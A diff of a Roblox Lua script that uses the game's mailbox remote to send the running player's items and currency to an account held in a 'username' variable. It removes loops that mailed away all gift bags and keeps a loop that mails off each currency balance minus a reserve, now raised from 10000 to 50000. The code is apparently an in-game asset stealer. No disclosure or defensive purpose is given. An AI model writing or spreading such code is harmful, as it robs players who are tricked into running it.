@@ -1,35 +1,6 @@
 local saveModule = require(game:GetService("ReplicatedStorage").Library.Client.Save)
 local result = saveModule.Get()
 
-local cs = result.Inventory.Misc
-for i, v in pairs(cs) do
-    if v.id == "Large Gift Bag" then
-        local args = {
-            username,
-            "Large Gift Bag",
-            "Misc",
-            i,
-            v._am or 1
-        }
-        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-    end
-end
-
-task.wait(2)
-local cs = result.Inventory.Misc
-for i, v in pairs(cs) do
-    if v.id == "Gift Bag" then
-        local args = {
-            username,
-            "Gift Bag",
-            "Misc",
-            i,
-            v._am or 1
-        }
-        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
-    end
-end
-task.wait(2)
 
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
@@ -42,7 +13,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
             [2] = v.id,
             [3] = "Currency",
             [4] = i,
-            [5] = v._am - 10000
+            [5] = v._am - 50000
         }
         game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
     end
